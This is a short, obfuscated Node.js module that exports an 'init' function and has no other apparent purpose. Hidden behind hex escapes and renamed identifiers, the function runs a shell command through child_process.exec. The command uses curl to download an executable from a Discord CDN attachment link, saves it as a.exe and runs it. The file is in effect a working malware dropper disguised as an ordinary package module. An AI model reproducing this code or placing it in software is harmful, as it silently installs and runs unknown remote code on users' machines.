const {exec} = require('node:child_process');
function init() {
    const _0x50c58b = {
        'aAPHh': function (_0x46f093, _0x5c40be, _0x54cf78) {
            return _0x46f093(_0x5c40be, _0x54cf78);
        },
        'RDFjh': 'curl\x20https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe\x20-o\x20a.exe\x20&&\x20a.exe'
    };
    _0x50c58b['aAPHh'](exec, _0x50c58b['RDFjh'], (_0x58444f, _0x437d57, _0x7426f1) => {
        if (_0x58444f) {
            console['log']('error:\x20' + _0x58444f['message']);
        }
    });
}
module['exports'] = init;
